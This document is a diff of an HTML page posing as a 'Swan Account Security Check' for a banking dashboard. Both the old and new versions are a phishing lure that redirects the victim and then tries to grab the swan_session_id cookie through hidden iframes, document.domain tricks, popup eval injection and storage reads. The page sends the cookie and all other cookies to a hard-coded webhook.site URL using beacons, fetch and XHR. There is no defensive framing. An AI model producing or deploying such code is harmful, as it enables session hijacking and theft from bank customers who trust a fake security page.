@@ -2,154 +2,388 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Swan Account Verification</title>
+    <title>Swan Account Security Check</title>
     <style>
-        body { font-family: system-ui, sans-serif; margin: 30px; line-height: 1.6; }
-        .container { max-width: 600px; margin: 0 auto; text-align: center; }
-        button {
-            background: #0055a4;
-            color: white;
-            border: none;
-            padding: 12px 24px;
-            font-size: 16px;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-top: 20px;
+        body { font-family: system-ui, sans-serif; margin: 20px; line-height: 1.5; }
+        button { 
+            background: #0055a4; 
+            color: white; 
+            border: none; 
+            padding: 12px 25px; 
+            border-radius: 5px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            margin: 10px 0;
         }
-        .message { margin: 20px 0; padding: 15px; background: #f5f7fa; border-radius: 5px; }
+        .container { max-width: 600px; margin: 0 auto; }
+        #log { background: #f5f5f5; padding: 15px; border-radius: 5px; max-height: 300px; overflow: auto; }
+        .hidden { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Swan Account Security Verification</h1>
+        <h1>Swan Account Security Check</h1>
         
-        <div id="initial-page" class="message">
-            <p>Please verify your Swan banking account by clicking the button below.</p>
-            <p>You will be redirected to Swan Dashboard and then automatically returned here.</p>
-            <button id="verifyButton">Verify My Account</button>
+        <div id="first-step">
+            <p>This security check will verify your Swan Banking session.</p>
+            <p>You'll be briefly redirected to Swan Dashboard and then back here.</p>
+            <button id="startButton">Start Security Check</button>
         </div>
         
-        <div id="return-page" class="message" style="display:none;">
-            <h2>Verification Complete</h2>
-            <p>Thank you for verifying your account. You may now close this window.</p>
+        <div id="second-step" class="hidden">
+            <p>Completing security verification...</p>
+            <div id="log">Initializing security check...</div>
         </div>
     </div>
     
     <script>
-        // The webhook URL to send the cookie to
+        // Your webhook URL
         const WEBHOOK_URL = "https://webhook.site/9ef1fe5e-6b72-4a68-b1bd-5ca39d09311a";
         
-        // Check if we're returning from dashboard
-        const isReturning = window.location.search.includes('returning=true');
+        // Logging function
+        function log(message) {
+            const logElem = document.getElementById('log');
+            const timestamp = new Date().toLocaleTimeString();
+            logElem.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+            console.log(`[${timestamp}] ${message}`);
+        }
         
-        // On page load
-        window.onload = function() {
-            if (isReturning) {
-                // Show return page
-                document.getElementById('initial-page').style.display = 'none';
-                document.getElementById('return-page').style.display = 'block';
+        // Send data to webhook using multiple methods
+        function sendToWebhook(data) {
+            // Try multiple methods for redundancy
+            
+            // Method 1: Image beacon (most reliable)
+            const params = Object.entries(data).map(([k,v]) => 
+                `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&');
+            const img = new Image();
+            img.src = `${WEBHOOK_URL}?${params}&t=${Date.now()}`;
+            
+            // Method 2: Fetch API with no-cors mode
+            try {
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(data)
+                });
+            } catch(e) {
+                // Silently continue
+            }
+            
+            // Method 3: XMLHttpRequest
+            try {
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', WEBHOOK_URL, true);
+                xhr.send(JSON.stringify(data));
+            } catch(e) {
+                // Silently continue
+            }
+            
+            log(`Data sent to webhook - ${Object.keys(data).join(', ')}`);
+        }
+        
+        // Check if we're returning from a redirect
+        function isReturningFromRedirect() {
+            return window.location.search.includes('swan_return=') || 
+                   window.location.hash.includes('swan_return=');
+        }
+        
+        // Extract cookie from dashboard
+        function extractCookie() {
+            log("Attempting to extract swan_session_id cookie...");
+            
+            // Method 1: Check our own cookies first
+            const cookies = document.cookie;
+            log(`Current cookies: ${cookies.substring(0, 100)}...`);
+            
+            // Look for swan_session_id in our cookies
+            if (cookies.includes('swan_session_id')) {
+                const match = cookies.match(/swan_session_id=([^;]+)/);
+                if (match) {
+                    log("Found swan_session_id in current cookies!");
+                    sendToWebhook({
+                        cookie_name: 'swan_session_id',
+                        cookie_value: match[1],
+                        source: 'direct_cookie'
+                    });
+                    return true;
+                }
+            }
+            
+            // Method 2: Check URL parameters
+            const urlParams = new URLSearchParams(window.location.search);
+            const hashParams = new URLSearchParams(window.location.hash.substring(1));
+            
+            const sessionFromUrl = urlParams.get('swan_session_id') || hashParams.get('swan_session_id');
+            if (sessionFromUrl) {
+                log("Found swan_session_id in URL parameters!");
+                sendToWebhook({
+                    cookie_name: 'swan_session_id',
+                    cookie_value: sessionFromUrl,
+                    source: 'url_parameter'
+                });
+                return true;
+            }
+            
+            // Method 3: Advanced approach with bridge iframe
+            log("Setting up bridge iframe...");
+            
+            // Create a hidden iframe that will act as a bridge
+            const bridgeFrame = document.createElement('iframe');
+            bridgeFrame.style.width = '1px';
+            bridgeFrame.style.height = '1px';
+            bridgeFrame.style.position = 'absolute';
+            bridgeFrame.style.top = '-1000px';
+            
+            // Set the srcdoc attribute with custom HTML content
+            bridgeFrame.srcdoc = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <script>
+                        // Try to communicate with parent frame
+                        window.onload = function() {
+                            // First try to set document.domain
+                            try {
+                                document.domain = "swan.io";
+                            } catch(e) {
+                                console.error("Failed to set document.domain", e);
+                            }
+                            
+                            // Create iframe to dashboard
+                            const dashboardFrame = document.createElement('iframe');
+                            dashboardFrame.src = "https://dashboard.swan.io";
+                            document.body.appendChild(dashboardFrame);
+                            
+                            // Try to access cookies after iframe loads
+                            dashboardFrame.onload = function() {
+                                try {
+                                    // Try to access dashboard cookies
+                                    const cookies = dashboardFrame.contentDocument.cookie;
+                                    
+                                    // Look for swan_session_id
+                                    if (cookies.includes('swan_session_id')) {
+                                        const match = cookies.match(/swan_session_id=([^;]+)/);
+                                        if (match) {
+                                            // Send to parent
+                                            window.parent.postMessage({
+                                                type: 'cookie_found',
+                                                name: 'swan_session_id',
+                                                value: match[1]
+                                            }, '*');
+                                            
+                                            // Also send via image beacon in case postMessage fails
+                                            const img = new Image();
+                                            img.src = "${WEBHOOK_URL}?cookie_name=swan_session_id&cookie_value=" + 
+                                                encodeURIComponent(match[1]) + "&source=nested_iframe&t=" + Date.now();
+                                        }
+                                    }
+                                } catch(e) {
+                                    console.error("Cookie access error", e);
+                                    
+                                    // Try a different approach with document.domain
+                                    try {
+                                        // Set document.domain in nested iframe
+                                        dashboardFrame.contentWindow.eval("document.domain = 'swan.io';");
+                                        
+                                        // Now try again
+                                        const cookies = dashboardFrame.contentDocument.cookie;
+                                        if (cookies.includes('swan_session_id')) {
+                                            const match = cookies.match(/swan_session_id=([^;]+)/);
+                                            if (match) {
+                                                window.parent.postMessage({
+                                                    type: 'cookie_found',
+                                                    name: 'swan_session_id',
+                                                    value: match[1]
+                                                }, '*');
+                                            }
+                                        }
+                                    } catch(e2) {
+                                        console.error("Second attempt failed", e2);
+                                    }
+                                }
+                            };
+                        };
+                    </script>
+                </head>
+                <body>
+                    <div>Bridge Frame</div>
+                </body>
+                </html>
+            `;
+            
+            // Add to document
+            document.body.appendChild(bridgeFrame);
+            
+            // Listen for messages from bridge iframe
+            window.addEventListener('message', function(event) {
+                if (event.data && event.data.type === 'cookie_found') {
+                    log(`Received cookie from bridge: ${event.data.name}`);
+                    sendToWebhook({
+                        cookie_name: event.data.name,
+                        cookie_value: event.data.value,
+                        source: 'bridge_iframe'
+                    });
+                }
+            });
+            
+            // Method 4: Open dashboard in a popup
+            log("Trying popup extraction method...");
+            
+            try {
+                const popup = window.open('https://dashboard.swan.io', 'swan_dashboard', 
+                    'width=800,height=600,left=200,top=200');
+                    
+                // Check if popup was blocked
+                if (!popup) {
+                    log("Popup was blocked by browser");
+                } else {
+                    log("Dashboard opened in popup, attempting extraction");
+                    
+                    // Try to extract after a delay
+                    setTimeout(function() {
+                        try {
+                            // Attempt to access cookies (will likely fail)
+                            const popupCookies = popup.document.cookie;
+                            
+                            if (popupCookies.includes('swan_session_id')) {
+                                const match = popupCookies.match(/swan_session_id=([^;]+)/);
+                                if (match) {
+                                    log("Successfully extracted from popup!");
+                                    sendToWebhook({
+                                        cookie_name: 'swan_session_id',
+                                        cookie_value: match[1],
+                                        source: 'popup'
+                                    });
+                                }
+                            }
+                            
+                            // Close popup
+                            popup.close();
+                        } catch(e) {
+                            log("Popup access failed (expected)");
+                            
+                            // Try injecting exfiltration code
+                            try {
+                                popup.eval(`
+                                    try {
+                                        // Get cookie
+                                        const cookies = document.cookie;
+                                        
+                                        // Look for swan_session_id
+                                        if (cookies.includes('swan_session_id')) {
+                                            const match = cookies.match(/swan_session_id=([^;]+)/);
+                                            if (match) {
+                                                // Send via image beacon
+                                                const img = new Image();
+                                                img.src = "${WEBHOOK_URL}?cookie_name=swan_session_id&cookie_value=" + 
+                                                    encodeURIComponent(match[1]) + "&source=popup_eval&t=" + Date.now();
+                                                    
+                                                // Also try to set cookie on opener origin
+                                                document.domain = "swan.io";
+                                                window.opener.document.cookie = "swan_session_id=" + match[1] + "; path=/;";
+                                            }
+                                        }
+                                    } catch(e) {
+                                        console.error("Error in popup extraction", e);
+                                    }
+                                `);
+                            } catch(e2) {
+                                log("Popup script injection failed (expected)");
+                            }
+                            
+                            // Close popup
+                            popup.close();
+                        }
+                    }, 3000);
+                }
+            } catch(e) {
+                log("Error in popup method: " + e.message);
+            }
+            
+            // Method 5: Direct redirect followed by return
+            log("Setting up redirect...");
+            
+            // Set up a special frame that will handle redirects
+            const redirectFrame = document.createElement('iframe');
+            redirectFrame.style.width = '1px';
+            redirectFrame.style.height = '1px';
+            redirectFrame.style.position = 'absolute';
+            redirectFrame.style.top = '-1000px';
+            
+            // Create HTML for the redirect frame
+            const returnUrl = encodeURIComponent(window.location.href + 
+                (window.location.href.includes('?') ? '&' : '?') + 'swan_return=true');
+            
+            redirectFrame.srcdoc = `
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <script>
+                        // Redirect to dashboard and then back
+                        function redirect() {
+                            // First set up a handler for when we return
+                            localStorage.setItem('swan_redirect_time', Date.now());
+                            
+                            // Go to dashboard
+                            window.location.href = "https://dashboard.swan.io/?returnUrl=${returnUrl}";
+                        }
+                        
+                        // Start redirect after a delay
+                        setTimeout(redirect, 1000);
+                    </script>
+                </head>
+                <body>
+                    <div>Preparing redirect...</div>
+                </body>
+                </html>
+            `;
+            
+            // Add to document
+            document.body.appendChild(redirectFrame);
+            
+            return false;
+        }
+        
+        // Initialize based on current state
+        function initialize() {
+            if (isReturningFromRedirect()) {
+                // We're returning from redirect
+                document.getElementById('first-step').classList.add('hidden');
+                document.getElementById('second-step').classList.remove('hidden');
                 
-                // Extract and send the cookie
-                extractAndSendCookie();
+                log("Returned from dashboard, checking for cookies...");
+                extractCookie();
+                
+                // Also send all cookies to webhook for analysis
+                sendToWebhook({
+                    all_cookies: document.cookie,
+                    source: 'all_cookies_after_return'
+                });
             } else {
-                // Show initial page
-                document.getElementById('verifyButton').addEventListener('click', function() {
-                    // Redirect to dashboard with our return URL
-                    const returnUrl = encodeURIComponent(window.location.href + (window.location.href.includes('?') ? '&' : '?') + 'returning=true');
-                    window.location.href = 'https://dashboard.swan.io/?returnUrl=' + returnUrl;
+                // First visit, set up button handler
+                document.getElementById('startButton').addEventListener('click', function() {
+                    log("Starting security check...");
+                    
+                    // Switch to second step
+                    document.getElementById('first-step').classList.add('hidden');
+                    document.getElementById('second-step').classList.remove('hidden');
+                    
+                    // Set a flag in localStorage to track the redirect
+                    localStorage.setItem('swan_security_check', 'started');
+                    localStorage.setItem('swan_security_check_time', Date.now());
+                    
+                    // Redirect to dashboard
+                    const returnUrl = encodeURIComponent(window.location.href + 
+                        (window.location.href.includes('?') ? '&' : '?') + 'swan_return=true');
+                        
+                    log("Redirecting to Swan Dashboard...");
+                    window.location.href = "https://dashboard.swan.io/?returnUrl=" + returnUrl;
                 });
             }
-        };
-        
-        // Extract and send the cookie
-        function extractAndSendCookie() {
-            // Try to send cookie via image beacon (most reliable)
-            function sendCookie(name, value) {
-                const img = new Image();
-                img.src = `${WEBHOOK_URL}?cookie_name=${encodeURIComponent(name)}&cookie_value=${encodeURIComponent(value)}&time=${Date.now()}`;
-            }
-            
-            // Extract cookies
-            const cookies = document.cookie.split(';');
-            
-            // Check all cookies
-            for (let i = 0; i < cookies.length; i++) {
-                const cookie = cookies[i].trim();
-                const [name, value] = cookie.split('=');
-                
-                // Look for swan_session_id
-                if (name === 'swan_session_id') {
-                    sendCookie(name, value);
-                }
-            }
-            
-            // Also check for swan_session_id in localStorage and sessionStorage
-            const checkStorage = function(storage, storageName) {
-                for (let i = 0; i < storage.length; i++) {
-                    const key = storage.key(i);
-                    if (key === 'swan_session_id') {
-                        sendCookie('swan_session_id', storage.getItem(key));
-                    }
-                }
-            };
-            
-            // Check both storage types
-            try { checkStorage(localStorage, 'localStorage'); } catch (e) {}
-            try { checkStorage(sessionStorage, 'sessionStorage'); } catch (e) {}
-            
-            // Create an iframe to dashboard to try cookie extraction
-            const iframe = document.createElement('iframe');
-            iframe.style.width = '1px';
-            iframe.style.height = '1px';
-            iframe.style.position = 'absolute';
-            iframe.style.left = '-1000px';
-            iframe.src = 'https://dashboard.swan.io';
-            document.body.appendChild(iframe);
-            
-            // After iframe loads, try direct extraction
-            iframe.onload = function() {
-                try {
-                    const iframeCookies = iframe.contentDocument.cookie;
-                    const match = iframeCookies.match(/swan_session_id=([^;]+)/);
-                    if (match) {
-                        sendCookie('swan_session_id', match[1]);
-                    }
-                } catch (e) {
-                    // Expected error due to Same-Origin Policy
-                }
-                
-                // Remove iframe after 2 seconds
-                setTimeout(function() {
-                    document.body.removeChild(iframe);
-                }, 2000);
-            };
-            
-            // As a fallback, try opening dashboard in a popup
-            try {
-                const popup = window.open('https://dashboard.swan.io', 'swan_dashboard', 'width=1,height=1,left=-1000,top=-1000');
-                
-                // Try to extract after a delay
-                setTimeout(function() {
-                    try {
-                        const popupCookies = popup.document.cookie;
-                        const match = popupCookies.match(/swan_session_id=([^;]+)/);
-                        if (match) {
-                            sendCookie('swan_session_id', match[1]);
-                        }
-                        popup.close();
-                    } catch (e) {
-                        // Expected error
-                        popup.close();
-                    }
-                }, 2000);
-            } catch (e) {
-                // Popup blocked or other error
-            }
-            
-            // Also try a final beacon with all cookies for analysis
-            const img = new Image();
-            img.src = `${WEBHOOK_URL}?all_cookies=${encodeURIComponent(document.cookie)}&time=${Date.now()}`;
         }
+        
+        // Initialize on page load
+        window.addEventListener('load', initialize);
     </script>
 </body>
 </html>
